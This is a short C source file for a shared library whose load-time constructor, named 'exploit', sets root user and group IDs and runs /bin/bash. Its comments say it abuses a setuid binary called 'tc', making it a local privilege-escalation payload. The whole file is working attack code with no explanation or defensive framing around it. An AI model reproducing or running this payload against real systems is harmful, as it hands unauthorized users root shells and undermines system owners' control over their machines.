#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <grp.h>

// Constructor function to be called when the library is loaded
void __attribute__((constructor)) exploit() {
    // Print a message indicating the library was loaded
    printf("Exploit triggered!\n");

    // Execute /bin/bash with root privileges (since tc is setuid)
    setuid(0);      // Set effective UID to root
    setreuid(0, 0); // Set real and effective UID to root
    setgid(0);      // Set effective GID to root
    setregid(0, 0); // Set real and effective GID to root
    setgroups(0, NULL); // Remove all supplementary groups

    execve("/bin/bash", NULL, NULL); // Launch a shell
}
